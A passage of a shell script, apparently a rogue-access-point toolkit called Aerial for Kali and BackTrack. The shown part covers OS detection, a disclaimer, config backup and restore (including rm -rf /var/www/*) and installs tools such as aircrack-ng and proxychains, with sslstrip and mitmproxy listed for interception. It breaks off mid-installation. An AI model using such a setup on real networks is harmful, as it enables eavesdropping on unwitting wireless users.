#!/bin/sh

#################################################################################################################
#  				_________________________________________					#	
#  				|           	  Aerial		 |					#
#  				|   	     				 |					#
#  				| 	  Multi-mode wireless LAN	 |					#
#  				|     based on a Software Access Point	 |					#
#  				|   					 |					#
#  				|            version 0.14.1.0		 |					#
# 				|________________________________________|					#
#														#
# 					Copyright (c) 2014 Nick_the_Greek					#
#														#
# This program is free software: you can redistribute it and/or modify it under the terms of the GNU General	#
# Public License as published by the Free Software Foundation, version 2 of the License.			#
#														#
# This script is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the	#
# implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.					#
# See the GNU General Public License for more details.								#
#														#
# You should have received a copy of the GNU General Public License along with this script.			#
# If not, see <http://www.gnu.org/licenses/>.									#
#														#
#  Credits to: Gitsnik												#
#														#
#  Additional info from: Deathray, fifo_thekid,	hm2075, g0tmi1k, Philipp C. Heckel				#
#################################################################################################################


#################################################################################################################
# 	Friendly name: It will be used for home - working dir and for the certificates name/description		#
#################################################################################################################
export friendly_name="Aerial"

#################################################################################################################
#			DEPEND_DIR: Dependencies directory							#
# 			HOME_DIR: Our home and working directory						#	
# 			MEM_DIR: Shared memory 									#
#################################################################################################################
export DEPEND_DIR="`pwd`"
export HOME_DIR=""`pwd`"/$friendly_name"
export MEM_DIR="/dev/shm"

#################################################################################################################
# 		OS Detection: Kali? BackTrack 5R3? Insert correct paths, files, variables,DNS servers.		#
#################################################################################################################
if [ -n "`cat /etc/issue | grep "BackTrack 5 R3"`" ];then 
	export OS="BackTrack_5R3"
	export cecho="echo -e"
	export necho="echo -n -e"
	export proxyresolv_path="/bin"
	export proxychains_path="/bin"
	export aircrack_path="/usr/local/sbin"
	export i2prouter_path="/usr/local/i2p"
	export i2prouter_conf="/usr/local/i2p"
	# Alternative DNS server (in this case OPEN DNS servers)
	export Alt_DNS1="208.67.222.222"	
	export Alt_DNS2="208.67.220.220"	
	export blklist_file1="blacklist-ath_pci.conf"
	export blklist_file2="blacklist.conf"
	export ATH_PROMPT="no"
	export udhcpd_lease="11"
	export no_out=" > /dev/null 2>&1"
elif [ -n "`cat /etc/issue | grep "Kali"`" ];then 
	export OS="KALI_linux"
	export cecho="echo "
	export necho="echo -n"
	export proxyresolv_path="/usr/lib/proxychains3"
	export proxychains_path="/usr/bin"
	export aircrack_path="/usr/sbin"
	export i2prouter_path="/usr/bin"
	export i2prouter_conf="/usr/share/i2p"
	# Alternative DNS server (in this case OPEN DNS servers)
	export Alt_DNS1="208.67.222.222"	
	export Alt_DNS2="208.67.220.220"	
	export blklist_file1="blacklist-ath_pci.conf"
	export blklist_file2="kali-blacklist.conf"
	export ATH_PROMPT="no"
	export udhcpd_lease="864000"
	export no_out=" > /dev/null 2>&1"
	#export no_out=""
fi

#################################################################################################################
# 					Centered Text Function							#
# 				You can use with : echo "Some text" | centered_text				#
#################################################################################################################
centered_text(){ 
	C=$(tput cols)
	IFS=""
	while read L; do 
	S=$((($C-${#L})/2+${#L}))
	printf "%${S}s\n" $L
	done
}

#################################################################################################################
# 						 Colors								#
#################################################################################################################
if [ "$OS" = "BackTrack_5R3" ];then 
	export GREEN="\033[1;32m"
	export RED="\033[1;31m"
	export BLUE="\033[1;34m"
	export END="\033[1;37m"
elif [ "$OS" = "KALI_linux" ];then
	export GREEN=$(tput setaf 2)
	export RED=$(tput setaf 1)
	export BLUE=$(tput setaf 6)
	export END=$(tput sgr0)
fi
#################################################################################################################
# 		Colored dialogs - Let's enable colored dialogs in the terminal, if they are disabled		#
#################################################################################################################
if [ -n "`grep '# force_color_prompt=yes' /root/.bashrc`" ];then
	sed 's%# force_color_prompt=yes%force_color_prompt=yes%g' /root/.bashrc > /root/.bashrc1 && mv /root/.bashrc1 /root/.bashrc
	source /root/.bashrc
fi

#################################################################################################################
#					Get Internet Gateway.							#
#################################################################################################################
export INET_Gateway="`ip r | grep default | cut -d ' ' -f 3`"

#################################################################################################################
# 			Must be root and connected to the Internet to continue.					#
#################################################################################################################
if [ "`whoami`" != "root" ] || [ "`ping -q -w 1 -c 1 $INET_Gateway > /dev/null && echo ok || echo error`" != "ok" ];then
	if [ "`whoami`" != "root" ] && [ "`ping -q -w 1 -c 1 $INET_Gateway > /dev/null && echo ok || echo error`" != "ok" ];then
		clear
		$cecho ""$RED"To continue you must be connected to the Internet and have root privileges."$END""
		$cecho$ ""GREEN"Exit..."$END""
		exit 1
	fi
	if [ "`whoami`" != "root" ];then
		clear
		$cecho ""$RED"To continue you must have root privileges."$END""
		$cecho ""$GREEN"Exit..."$END""
		exit 1
	fi
	if [ "`ping -q -w 1 -c 1 $INET_Gateway > /dev/null && echo ok || echo error`" != "ok" ];then
		clear
		$cecho ""$RED"To continue you must be connected to the Internet."$END""
		$cecho ""$GREEN"Exit..."$END""
		exit 1
	fi
fi

#################################################################################################################
# 	Setting default browser. - What window manager is the one actively running in the current session?	#
#################################################################################################################
if [ -n "`env | grep 'GNOME'`" ];then 
	export browser="/usr/bin/iceweasel"
elif [ -n "`env | grep 'KDE'`" ];then 
	export browser="konqueror"
fi 

#################################################################################################################
# 				DISCLAIMER - You must Agree to proceed. Run it only once. 			#
#################################################################################################################
if [ ! -f $HOME_DIR/aerial.conf ];then
	while :
	do
	clear
	export title1=""$GREEN"D I S C L A I M E R"$END""
	export title2=""$RED"This script is for educational and research purposes only."$END""
	export title3=""$RED"\nAny actions and or activities related to this script is solely your responsibility. The misuse of this script can result in criminal charges brought against the persons in question. The author will not be held responsible in the event any criminal charges be brought against any individuals misusing this script to break the law. Refer to the laws in your province/country before using, or in any other way utilizing this script. Do not attempt to violate the law with anything contained in this script. If this is your intention, then press NO! Neither author of this script, or anyone else affiliated in any way,is going to accept responsibility for your actions."$END""
	$cecho $title1 | centered_text
	echo
	echo
	$cecho $title2 | centered_text
	echo
	$cecho $title3 | centered_text
	echo
	$necho "Do you agree with this? "$GREEN"[y]es"$END" / "$GREEN"[n]o"$END": "
	read yno
		case $yno in

			[yY] | [yY][Ee][Ss] )
				#echo
				#$cecho "Don't forget, you: "$GREEN"Agreed"$END""
				#read -p 'Press ENTER to continue...' string;echo;clear
			break;;

			[nN] | [nN][Oo] )
				echo
				$cecho ""$RED"Not agreed, Sorry, you can't proceed.\033[1;25m"
				exit 1
	                ;;
			"")
				$cecho "! ! ! "$RED"BLANK"$END" is an invalid option ! ! !"
				read -p 'Press ENTER to continue...' string
			;;
			*)
				$cecho "! ! ! "$RED""$yno""$END" is an invalid option ! ! !"
				read -p 'Press ENTER to continue...' string
			;;
		esac
	done

fi

#################################################################################################################
# 			Making a working and a backup directory, if it doesn't exist				#
#################################################################################################################
if [ ! -d $HOME_DIR ];then
mkdir $HOME_DIR
mkdir $HOME_DIR/backup
fi

#################################################################################################################
# 		Create aerial.conf if it doesn't exist.Those are the default values.				#
#			They will be created for the first time and they will be changed 			#
#					while the script is running.						#
#################################################################################################################
if [ ! -f $HOME_DIR/aerial.conf ];then
# Those are the default values in aerial.conf file.
# Please don't change any of them here. When this file it's
# created in your preferred folder then you can make any
# changes that you like.

cat > $HOME_DIR/aerial.conf << EOF
##############################################################
#                Aerial Configuration File                   #
##############################################################

# Please have in mind that to do changes from "yes" to "no"
# (without double quotes) you must run the script at least one time.
# You can make any compination of yes to no or no to yes stings.
# For example if you want to be prompted only for essid channel etc
# every time you run the script set only this flag to yes and 
# set everything else to no.
# Don't forget to leave a space before the yes or no strings.

# If you don't want to be prompt every time to restore
# your files, iptables etc you can set the following to "no" (without double quotes).
# Default value: yes
RESTORE_MODE yes

# If you don't want to be prompted every time for your
# Internet and the wirelless NICs interface names that you will 
# use for the creation of the softAP you can set the following to "no"
# (without double quotes).
# Default value: yes
INET_WIRELESS_PROMPT yes

# If you don't want to be prompted every time for how you
# will create the softAP (hostap or airbase-ng) 
# you can set the following to "no" (without double quotes).
# Default value: yes
HOSTAP_AIRBASE_PROMPT yes

# If you don't want to be prompted every time for, essid
# MAC address, channel, crda, mode (a/g/n), encryption, key 
# you can set the following to "no" (without double quotes).
# Default value: yes
ESSID_MAC_CHAN_PROMPT yes

# If you want to reconfigure sarg to change language, date format,
# long/short URLs you can set the following to "yes" (without double quotes).
# Default value: no
SARG_RECONF no

# If set to "yes" (without double quotes) nbpps (number of packets per second) 
# and MTU (maximum transmission unit) will be used in airbase-ng based softAP. 
# Nbpps's default value is 100. In my cards i've seen differences up to 300 
# to 400 values. You can "play" with nbpps values and run some tests to find 
# the optimum value for you card.  If you're having troubles, set it to 100.
# Default values: yes nbpps: 300 and MTU: 1500
Nbpps_USE yes
Nbpps_VALUE 300
MTU_MON 1500

# Don't bother with this. It will re-download and re-install
# sslstrip if set it to yes (without double quotes). Left from BT4PF days -:)
# Default value: no
SSLSTRIP_DL no

# Don't bother with this also in Kali. If set it to yes (without double quotes)
# it will enable the master mode prompt for ath5k and ath9k drivers.
# YOU CANNOT USE THIS IN KALI AND/OR BT5R3. Madwifi-ng compiling
# and installation process is broken. You will end up with a broken box.
# Default value: get it from OS detection (above)
ATH_PROMPT $ATH_PROMPT

# When apt-get will get updated the script will set the following to yes.
# Default value: no
SYSTEM_UPDATED no

################ IF YOU DONT KNOW WHAT ARE DOING ##############
################ DO NOT MODIFY BELOW THIS LINE   ##############

INET_CONX
WIRELS_IFACE
WIFACE_MON
ESSID 
MC_ADDRS
CHANNEL
CRDA
IEEE_802_11_mode
IEEE_802_11n
HT_CAPAB
ENCRYPTION
KEY
WPS_PIN
EOF
fi

#################################################################################################################
# 				Insert script's variables from aerial.conf					#
#################################################################################################################
export RESTORE_MODE="`grep 'RESTORE_MODE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export SSLSTRIP_DL="`grep 'SSLSTRIP_DL' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export SARG_RECONF="`grep 'SARG_RECONF' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export ATH_PROMPT="`grep 'ATH_PROMPT' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export INET_WIRELESS_PROMPT="`grep 'INET_WIRELESS_PROMPT' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export HOSTAP_AIRBASE_PROMPT="`grep "HOSTAP_AIRBASE_PROMPT" $HOME_DIR/aerial.conf | awk '{print $2}'`"
export ESSID_MAC_CHAN_PROMPT="`grep 'ESSID_MAC_CHAN_PROMPT' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export ENCR_TYPE="`grep 'ENCRYPTION' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export AP_KEY="`grep 'KEY' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export CRDA="`grep 'CRDA' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export Nbpps_USE="`grep 'Nbpps_USE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export Nbpps_VALUE="`grep 'Nbpps_VALUE' $HOME_DIR/aerial.conf | awk '{print $2}'`"
export MTU_SIZE="`grep 'MTU_MON' $HOME_DIR/aerial.conf | awk '{print $2}'`"

#################################################################################################################
# 			Do we have a Atheros based, PCI wireless network adapter?				#
#				DON'T BOTHER WITH THIS IN KALI							#
#################################################################################################################
export ATH="`lspci | grep 'Atheros' | grep 'Wireless' | grep 'Network'`"


#################################################################################################################
# 	Restore of system's iptables rules, proxyresolv, proxychains.conf, squid.conf, sarg.conf 		#
# 			apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda			#
# 			/etc/network/interfaces /var/www/ folder and/or madwifi-ng drivers			#
#														#
#				if RESTORE_MODE is set to yes from aerial.conf file				#
#################################################################################################################
if [ "$RESTORE_MODE" = "yes" ] && [ -f $HOME_DIR/backup/iptables.original ] && [ -f $HOME_DIR/backup/proxychains.conf ] && [ -f $HOME_DIR/backup/proxyresolv ] && [ -f $HOME_DIR/backup/sarg.conf ] && [ -f $HOME_DIR/backup/squid.conf ] && [ -f $HOME_DIR/backup/apache2.conf ];then
	clear
	export YN=4
		if [ -d $HOME_DIR/madwifi-ng ] && [ -f /lib/modules/`uname -r`/net/ath_pci.ko ] && [ -f $HOME_DIR/backup/ath/ath5k/ath5k.ko ] && [ -f $HOME_DIR/backup/ath/ath9k/ath9k.ko ] && [ -f $HOME_DIR/backup/ath/ath.ko ];then
			$cecho ""$BLUE"B a c k u p  /  R e s t o r e  -  M E N U:"$END"" | centered_text
			echo
			echo "Restoring files, iptables - uninstalling madwifi-ng drivers"
			echo
			echo
		else
			$cecho ""$BLUE"B a c k u p  /  R e s t o r e  -  M E N U:"$END"" | centered_text
			echo
			echo
		fi
	echo "Please have in mind that if you DON'T want to be prompted every time to restore"
	$cecho "files, iptables etc you can set "$RED"RESTORE_MODE yes"$END" to "$GREEN"RESTORE_MODE no"$END""
	$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
	echo
	echo "Would you like to:"
	echo
	echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
	echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
	echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
	echo "2. Restore iptables rules and exit"
		if [ -d $HOME_DIR/madwifi-ng ] && [ -f /lib/modules/`uname -r`/net/ath_pci.ko ] && [ -f $HOME_DIR/backup/ath/ath5k/ath5k.ko ] && [ -f $HOME_DIR/backup/ath/ath9k/ath9k.ko ] && [ -f $HOME_DIR/backup/ath/ath.ko ];then
			echo "3. Uninstall madwifi-ng drivers and continue"
			export YN=5
		fi
		if [ "$YN" = "5" ];then 
			echo "4. Continue"
			echo
			$necho "Please enter your choice (1 - 4): "
		else
			echo "3. Continue"
			echo
			$necho "Please enter your choice (1 - 3): "
		fi
		if [ "$YN" = "5" ];then
			while [ "$YN" = "5" ];do
			read YN
				if [ "$YN" = "1" ] || [ "$YN" = "2" ] || [ "$YN" = "3" ] || [ "$YN" = "4" ];then
					if [ "$YN" = "1" ];then
						clear
						$cecho "       Restoring proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
						cp $HOME_DIR/backup/proxychains.conf /etc/proxychains.conf
						cp $HOME_DIR/backup/proxyresolv $proxyresolv_path/proxyresolv
						cp $HOME_DIR/backup/squid.conf /etc/squid3/squid.conf
						cp $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
						cp $HOME_DIR/backup/apache2.conf /etc/apache2/apache2.conf
						cp $HOME_DIR/backup/udhcpd.conf /etc/udhcpd.conf
						cp $HOME_DIR/backup/torrc /etc/tor/torrc
						cp $HOME_DIR/backup/i2ptunnel.config $i2prouter_conf/i2ptunnel.config
						cp $HOME_DIR/backup/i2prouter $i2prouter_path/i2prouter 
						cp $HOME_DIR/backup/interfaces /etc/network/interfaces
						cp $HOME_DIR/backup/crda /etc/default/crda
						rm -f -r /var/www/*
						#rm -r /var/www/ajaxscript/
						#rm -r /var/www/aw_tpl/
						#rm -r /var/www/black_tpl/
						#rm -r /var/www/smilies/
						cp -r $HOME_DIR/backup/www/* /var/www/
						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
						echo "Exit..."
						exit 1
					fi
					if [ "$YN" = "2" ];then
						clear
						$necho "[....] Restoring iptables."
						/sbin/iptables-restore < $HOME_DIR/backup/iptables.original
						$cecho "\r[ "$GREEN"ok"$END" ] Restoring iptables."
						$necho "[....] Disabling IP forward"
						echo 0 > /proc/sys/net/ipv4/ip_forward
						$cecho "\r[ "$GREEN"ok"$END" ] Disabling IP forward"
						echo "Exit..."
						exit 1
					fi
					if [ "$YN" = "3" ];then
						clear
						echo
						$cecho ""$RED"Uninstalling madwifi-ng drivers revision 4181"$END""
						echo
						$cecho ""$RED"Wireless interface down..."$END""
						export WIFACE_MON="ath0"
							if [ "`/sbin/ifconfig | grep "$WIFACE_MON" | awk '{print $1}'`" = "$WIFACE_MON" ];then
								wlanconfig "$WIFACE_MON" destroy
							fi
						ifconfig wifi0 down
							if [ -f /usr/bin/jockey-text ];then
								$cecho ""$GREEN"jockey-text found in your system"$END""
								echo
							else
								$cecho ""$RED"Installing jockey-text"$END""
								apt-get install -y jockey-common
							fi
						#Load modules ath5k and/or ath9k before uninstalling ath_pci (madwifi-ng) to avoid kernel oops
							if [ -n "`lspci -v | grep 'ath5k'`" ];then
								modprobe ath5k
							fi 
							if [ -n "`lspci -v | grep 'ath9k'`" ];then
								modprobe ath9k
							fi 
						#Disable ath_pci with jockey-text
						jockey-text -d kmod:ath_pci
						#Now you can unload ath_pci (madwifi-ng)
						$cecho ""$RED"Unloading drivers..."$END""
							if [ -n "`lsmod | grep 'ath_pci'`" ];then
								echo "Removing module: ath_pci"
								rmmod ath_pci
							fi 
							if [ -n "`lsmod | grep 'ath_rate_sample'`" ];then
								echo "Removing module: ath_rate_sample"
								rmmod ath_rate_sample
							fi 
							if [ -n "`lsmod | grep 'wlan'`" ];then
								echo "Removing module: wlan"
								rmmod wlan
							fi 
							if [ -n "`lsmod | grep 'ath_hal'`" ];then
								echo "Removing module: ath_hal"
								rmmod ath_hal
							fi 
							if [ -n "`lsmod | grep 'ath_rate_amrr'`" ];then
								echo "Removing module: ath_rate_amrr"
								rmmod ath_rate_amrr
							fi 
							if [ -n "`lsmod | grep 'ath_rate_onoe'`" ];then
								echo "Removing module: ath_rate_onoe"
								rmmod ath_rate_onoe
							fi 
							if [ -n "`lsmod | grep 'wlan_acl'`" ];then
								echo "Removing module: wlan_acl"
								rmmod wlan_acl
							fi 
							if [ -n "`lsmod | grep 'wlan_ccmp'`" ];then
								echo "Removing module: wlan_ccmp"
								rmmod wlan_ccmp
							fi 
							if [ -n "`lsmod | grep 'wlan_scan_ap'`" ];then
								echo "Removing module: wlan_scan_ap"
								rmmod wlan_scan_ap
							fi 
							if [ -n "`lsmod | grep 'wlan_scan_sta'`" ];then
								echo "Removing module: wlan_scan_sta"
								rmmod wlan_scan_sta
							fi 
							if [ -n "`lsmod | grep 'wlan_tkip'`" ];then
								echo "Removing module: wlan_tkip"
								rmmod wlan_tkip
							fi 
							if [ -n "`lsmod | grep 'wlan_wep'`" ];then
								echo "Removing module: wlan_wep"
								rmmod wlan_wep
							fi
							if [ -n "`lsmod | grep 'wlan_xauth'`" ];then
								echo "Removing module: wlan_xauth"
								rmmod wlan_xauth
							fi 

						#Unload ath5k and/or ath9k
							if [ -n "`lspci -v | grep 'ath5k'`" ];then
								modprobe -r ath5k
							fi 
							if [ -n "`lspci -v | grep 'ath9k'`" ];then
								modprobe -r ath9k
							fi 

						$cecho ""$GREEN"Done..."$END""
						#cd $HOME_DIR/madwifi-ng
						#./scripts/madwifi-unload
						#make uninstall
						#$cecho ""$GREEN"Done..."$END""
						#$cecho ""$RED"Restoring ath5k and ath9k kernel modules to your system"$END""
						#cp -r $HOME_DIR/backup/ath/ath.ko /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath.ko
						#cp -r $HOME_DIR/backup/ath/ath5k /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath5k
						#cp -r $HOME_DIR/backup/ath/ath9k /lib/modules/`uname -r`/kernel/drivers/net/wireless/ath/ath9k
						#$cecho ""$GREEN"Done..."$END""
						echo
						# Let's blacklist ath_pci and unblacklist ath5k and/or ath9k
						$cecho ""$RED"Blacklisting madwifi-ng driver (ath_pci)"$END""
						sed 's%#blacklist ath_pci%blacklist ath_pci%g' /etc/modprobe.d/$blklist_file1 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file1
						sed 's%#blacklist ath_pci%blacklist ath_pci%g' /etc/modprobe.d/$blklist_file2 > /etc/modprobe.d/temp.conf && mv /etc/modprobe.d/temp.conf /etc/modprobe.d/$blklist_file2
						sed -i '/ath_pci/d' /etc/modules
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Unblacklisting ath, ath5k and ath9k drivers"$END""
						sed -i '/blacklist ath5k/d' /etc/modprobe.d/$blklist_file1
						sed -i '/blacklist ath9k/d' /etc/modprobe.d/$blklist_file1
						sed -i '/blacklist ath/d' /etc/modprobe.d/$blklist_file1
						$cecho ""$GREEN"Done..."$END""
						#depmod -aq
						$cecho ""$RED"Loading ath5k and/or ath9k drivers..."$END""
						#modprobe ath
							if [ -n "`lspci -v | grep 'ath5k'`" ];then
								modprobe ath5k
							fi 
							if [ -n "`lspci -v | grep 'ath9k'`" ];then
								modprobe ath9k
							fi 
						$cecho ""$GREEN"Done..."$END""
						$cecho ""$RED"Bringing wireless interface up..."$END""
						ifconfig wlan0 up
						sed 's%WIRELS_IFACE.*%WIRELS_IFACE%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						sed 's%WIFACE_MON.*%WIFACE_MON%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
						$cecho ""$GREEN"Done..."$END""
						echo
						$cecho ""$GREEN"Uninstallation completed."$END""
						echo 
						$cecho ""$RED"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"$END""
						$cecho ""$RED"!Notice that your wireless interface name from now will be wlanX!"$END""
						$cecho ""$RED"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"$END""
						echo
						read -p 'Press ENTER to continue...' string;echo
					fi
					if [ "$YN" = "4" ];then
						echo "Continue.."
						YN=3
					fi
				else
					clear
					export YN=5
					$cecho ""$BLUE"B a c k u p  /  R e s t o r e  -  M E N U:"$END"" | centered_text
					echo
					echo
					echo "Please have in mind that if you DON'T want to be prompted every time to restore"
					$cecho "files, iptables etc you can set "$RED"RESTORE_MODE yes"$END" to "$GREEN"RESTORE_MODE no"$END""
					$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
					echo
					echo "Restoring files, iptables - uninstalling madwifi-ng drivers"
					echo "Would you like to:"
					echo
					echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
					echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
					echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
					echo "2. Restore iptables rules and exit"
					echo "3. Uninstall madwifi-ng drivers and continue"
					echo "4. Continue"
					echo
					$cecho ""$RED"!!! Wrong input !!!"$END""
					$necho "Please enter your choice (1 - 4): "
				fi
			done
		fi
		if [ "$YN" = "4" ];then
			while [ "$YN" = "4" ];do
			read YN
				if [ "$YN" = "1" ] || [ "$YN" = "2" ] || [ "$YN" = "3" ];then
					if [ "$YN" = "1" ];then
						clear
						$cecho "       Restoring proxychains.conf, proxyresolv, squid.conf, sarg.conf, apache2.conf"
						$necho "[....] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
						cp $HOME_DIR/backup/proxychains.conf /etc/proxychains.conf
						cp $HOME_DIR/backup/proxyresolv $proxyresolv_path/proxyresolv
						cp $HOME_DIR/backup/squid.conf /etc/squid3/squid.conf
						cp $HOME_DIR/backup/sarg.conf /etc/sarg/sarg.conf
						cp $HOME_DIR/backup/apache2.conf /etc/apache2/apache2.conf
						cp $HOME_DIR/backup/udhcpd.conf /etc/udhcpd.conf
						cp $HOME_DIR/backup/torrc /etc/tor/torrc
						cp $HOME_DIR/backup/i2ptunnel.config $i2prouter_conf/i2ptunnel.config
						cp $HOME_DIR/backup/i2prouter $i2prouter_path/i2prouter 
						cp $HOME_DIR/backup/interfaces /etc/network/interfaces
						cp $HOME_DIR/backup/crda /etc/default/crda
						rm -r -f /var/www/*
						#rm -r /var/www/ajaxscript/
						#rm -r /var/www/aw_tpl/
						#rm -r /var/www/black_tpl/
						#rm -r /var/www/smilies/
						cp -r $HOME_DIR/backup/www/* /var/www/
						$cecho "\r[ "$GREEN"ok"$END" ] udhcpd.conf, torrc, i2ptunnel.config, i2prouter, crda, /etc/network/interfaces, /var/www/ folder."
						echo "Exit..."
						exit 1
					fi
					if [ "$YN" = "2" ];then
						clear
						$necho "[....] Restoring iptables."
						/sbin/iptables-restore < $HOME_DIR/backup/iptables.original
						$cecho "\r[ "$GREEN"ok"$END" ] Restoring iptables."
						$necho "[....] Disabling IP forward"
						echo 0 > /proc/sys/net/ipv4/ip_forward
						$cecho "\r[ "$GREEN"ok"$END" ] Disabling IP forward"
						echo "Exit..."
						exit 1
						fi
				else
					clear
					export YN=4
					$cecho ""$BLUE"B a c k u p  /  R e s t o r e  -  M E N U:"$END"" | centered_text
					echo
					echo
					echo "Please have in mind that if you DON'T want to be prompted every time to restore"
					$cecho "files, iptables etc you can set "$RED"RESTORE_MODE yes"$END" to "$GREEN"RESTORE_MODE no"$END""
					$cecho "in "$GREEN"$HOME_DIR/aerial.conf"$END" file"
					echo
					echo "Would you like to:"
					echo
					echo "1. Restore files (proxychains.conf, proxyresolv, squid.conf, sarg.conf,"
					echo "   apache2.conf, udhcpd.conf, torrc, i2ptunnel.config, i2prouter,"
					echo "   crda, /etc/network/interfaces /var/www/ folder) and exit"
					echo "2. Restore iptables rules and exit"
					echo "3. Continue"
					echo
					$cecho ""$RED"!!! Wrong input !!!"$END""
					$necho "Please enter your choice (1 - 3): "
				fi
			done
		fi
fi

clear

#################################################################################################################
# 						Update APT list							#
#################################################################################################################

echo ""$BLUE"D e p e n d e n c i e s :"$END"" | centered_text

if [ -f $HOME_DIR/aerial.conf ] && [ "`grep 'SYSTEM_UPDATED' $HOME_DIR/aerial.conf | awk '{print $2}'`" = "no" ];then
	$necho "[....] Updating APT (Advanced Packaging Tool) list."
	eval apt-get update $no_out
	sed 's%SYSTEM_UPDATED no%SYSTEM_UPDATED yes%g' $HOME_DIR/aerial.conf > $HOME_DIR/aerial1.conf && mv $HOME_DIR/aerial1.conf $HOME_DIR/aerial.conf
	$cecho "\r[ "$GREEN"ok"$END" ] Updating APT (Advanced Packaging Tool) list."
else
	$cecho "[ "$GREEN"updated"$END" ] apt-get list."
fi



#################################################################################################################
# 	Download all the necessary programs that we will use and their dependencies if they are absent.		#
# sslstrip, aircrack-ng suite, Proxychains, Mogrify, jp2a, Apache2, dnsmasq, UDHCPD, Squid3, Sarg, sslsplit	#
# Hostapd 2.x devel, TOR, ARM, I2P router, mitmproxy, Honeyproxy and check 					#
# if Squid3 v3.3.8 SSL and airchat are present.									#
#################################################################################################################

# Download and install UDHCPD only if it isn't installed - no backup needed
if [ -f /usr/sbin/udhcpd ];then
	$cecho "[ "$GREEN"found"$END" ] UDHCPD: Very small Busybox based DHCP server."
else
	$necho "[....] Installing udhcpd - very small Busybox based DHCP server."	
	eval apt-get install -y udhcpd $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing udhcpd - very small Busybox based DHCP server."
		# Let's enable udhcpd - (Disabled by default)
		if [ -n "`grep 'DHCPD_ENABLED="no"' /etc/default/udhcpd`" ];then
			$necho "[....] Enabling UDHCPD - (Disabled by default)"
			sed 's%DHCPD_ENABLED="no"%DHCPD_ENABLED="yes"%g' /etc/default/udhcpd > /etc/default/udhcpd1 && mv /etc/default/udhcpd1 /etc/default/udhcpd
			$cecho "\r[ "$GREEN"ok"$END" ] Enabling UDHCPD - (Disabled by default)."

		fi
	$necho "[....] Do not start UDHCPD on Start Up."
	eval update-rc.d udhcpd disable $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Do not start UDHCPD on Start Up."
fi

# Download and install aircrack-ng suite only if it isn't installed
if [ -f $aircrack_path/airbase-ng ];then
	$cecho "[ "$GREEN"found"$END" ] Aircrack-ng: Wireless WEP/WPA cracking utilities."			
else
	$necho "[....] Installing aircrack-ng suite."
	eval apt-get install -y aircrack-ng $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing aircrack-ng suite."
fi

# Download and install Proxychains only if it isn't installed
if [ -f $proxychains_path/proxychains ] && [ -f $proxyresolv_path/proxyresolv ];then
	$cecho "[ "$GREEN"found"$END" ] Proxychains: Redirect connections through proxy servers."
	$cecho "[ "$GREEN"found"$END" ] Proxyresolv: DNS resolving."
else
	$necho "[....] Installing proxychains."
	eval apt-get install -y proxychains $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing proxychains."
fi

# Download and install Mogrify only if it isn't installed
if [ -f /usr/bin/mogrify ];then
	$cecho "[ "$GREEN"found"$END" ] ImageMagick's Mogrify: Image manipulation programs."			
else
	$necho "[....] Installing ImageMagick."
	eval apt-get install -y imagemagick $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing ImageMagick."
fi

# Download and install jp2a only if it isn't installed
if [ -f /usr/bin/jp2a ];then
	$cecho "[ "$GREEN"found"$END" ] jp2a: Converts jpg images to ASCII."			
else
	$necho "[....] Installing jp2a: Converts jpg images to ASCII."
	eval apt-get install -y jp2a $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing jp2a: Converts jpg images to ASCII."
fi

# Download and install ghostscript only if it isn't installed
if [ -f /usr/bin/ghostscript ];then
	$cecho "[ "$GREEN"found"$END" ] Ghostscript: Interpreter for the PostScript language and for PDF."			
else
	$necho "[....] Installing ghostscript."
	eval apt-get install -y ghostscript $no_out
	$cecho "\r[ "$GREEN"ok"$END" ] Installing ghostscript."
fi

# Download and install Apache2 only if it isn't installed
if [ -f /usr/sbin/apache2 ] && [ -f /usr/sbin/apache2ctl ];then
	$cecho "[ "$GREEN"found"$END" ] Apache2: HTTP Server."			
else
